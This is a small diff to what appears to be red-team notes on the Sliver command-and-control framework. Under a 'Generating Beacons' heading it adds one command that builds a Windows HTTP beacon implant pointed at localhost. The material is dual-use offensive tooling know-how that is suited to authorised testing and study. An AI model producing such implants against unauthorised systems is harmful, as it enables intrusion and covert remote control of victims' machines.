@@ -86,7 +86,7 @@ sliver > armory install all
 ## Generating Beacons
 There's a lot of factors.
 ```bash
-
+sliver > generate beacon --http 127.0.0.1 --skip-symbols -N http_beacon --os windows
 ```
 
 ## Cheatsheet
